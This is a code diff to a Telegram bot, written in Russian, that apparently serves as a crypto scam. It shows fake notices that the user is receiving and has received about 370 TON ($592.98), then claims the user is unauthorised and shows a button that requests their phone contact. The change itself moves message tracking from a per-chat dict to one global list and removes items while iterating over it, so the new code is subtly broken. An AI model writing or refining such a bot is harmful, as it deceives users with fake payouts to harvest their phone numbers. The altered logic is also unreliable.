@@ -6,12 +6,12 @@ import time
 
 bot = telebot.TeleBot(confs.TOKEN)
 
-progress_messages = {}
+progress_messages = []
 
 def send_progress_income(chat_id, text="🕙 Получение 💠 370.61125 TON ($592.98)..."):
     msg = bot.send_message(chat_id, text)
     time.sleep(1)
-    progress_messages[chat_id] = msg.message_id
+    progress_messages.append(msg.message_id)
 
 def success(chat_id, text="📥 Вы получили 💠 370.61125 TON ($592.98)."):
     keyboard = types.InlineKeyboardMarkup(row_width=1)
@@ -34,7 +34,7 @@ def send_contact_location_keyboard(chat_id, text="Вы не авторизова
     btn = types.KeyboardButton("💼 Авторизоваться", request_contact=True)
     keyboard.add(btn)
     msg = bot.send_message(chat_id, text, reply_markup=keyboard)
-    progress_messages[chat_id] = msg.message_id
+    progress_messages.append(msg.message_id)
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -88,11 +88,12 @@ def start(message):
 def handler(message):
     user = message.from_user
     chat_id = message.chat.id
-    
+
     bot.delete_message(chat_id, message.message_id)
-    if chat_id in progress_messages:
-        bot.delete_message(chat_id, progress_messages[chat_id])
-        del progress_messages[chat_id]
+
+    for m in progress_messages:
+        bot.delete_message(chat_id, m)
+        progress_messages.remove(m)
     
     success(chat_id)
 
